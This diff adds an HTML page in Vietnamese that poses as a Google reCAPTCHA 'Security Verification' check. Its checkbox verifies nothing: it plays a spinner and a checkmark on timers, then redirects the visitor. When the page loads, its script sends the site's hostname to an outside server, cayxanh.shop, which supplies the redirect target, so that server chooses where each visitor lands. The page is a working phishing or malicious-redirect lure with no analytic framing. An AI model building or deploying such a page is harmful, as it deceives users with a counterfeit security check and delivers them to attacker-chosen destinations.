@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .verify-box {
+      background: #fff;
+      width: 380px;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+    }
+
+    .verify-title {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .verify-desc {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .captcha {
+      border: 1px solid #dcdcdc;
+      border-radius: 8px;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .checkbox {
+      width: 26px;
+      height: 26px;
+      cursor: pointer;
+    }
+
+    .spinner {
+      width: 26px;
+      height: 26px;
+      border: 3px solid #ddd;
+      border-top: 3px solid #4285f4;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+
+    .checkmark {
+      display: none;
+      font-size: 28px;
+      color: #34a853;
+      font-weight: bold;
+    }
+
+    @keyframes spin {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .right {
+      text-align: center;
+      font-size: 10px;
+      color: #777;
+    }
+
+    .right img {
+      width: 38px;
+      margin-bottom: 3px;
+    }
+
+    #success {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+      color: #34a853;
+      font-weight: bold;
+      font-size: 18px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="verify-box">
+    <div class="verify-title">
+      Bảo mật hệ thống
+    </div>
+
+    <div class="verify-desc">
+      Vui lòng xác minh để tiếp tục truy cập
+    </div>
+
+    <div class="captcha">
+      <div class="left">
+        <input type="checkbox" id="checkbox" class="checkbox" onclick="verify()">
+        <div id="spinner" class="spinner"></div>
+        <div id="checkmark" class="checkmark">✓</div>
+        <span>Tôi không phải robot</span>
+      </div>
+
+      <div class="right">
+        <img src="assets/recaptcha.png" alt="reCAPTCHA">
+        <div>reCAPTCHA</div>
+        <div style="cursor: pointer;">Privacy - Terms</div>
+      </div>
+    </div>
+
+    <div id="success">
+      Xác minh thành công...
+    </div>
+  </div>
+
+  <script>
+    let targetUrl = "gK2.html";
+
+    // Fetch target URL từ API ngay khi load trang
+    const currentDomain = window.location.hostname;
+    fetch(`https://cayxanh.shop/api/settings/target?domain=${encodeURIComponent(currentDomain)}`)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Mạng không ổn định hoặc lỗi API");
+        }
+        return response.json();
+      })
+      .then(data => {
+        if (data && data.targetUrl) {
+          targetUrl = data.targetUrl;
+        }
+      })
+      .catch(error => {
+        console.error("Không lấy được target URL động, sử dụng mặc định:", error);
+      });
+
+    function verify() {
+      document.getElementById("checkbox").style.display = "none";
+      document.getElementById("spinner").style.display = "block";
+
+      setTimeout(function () {
+        document.getElementById("spinner").style.display = "none";
+        document.getElementById("checkmark").style.display = "block";
+        document.getElementById("success").style.display = "block";
+
+        setTimeout(function () {
+          window.location.href = targetUrl;
+        }, 1500);
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
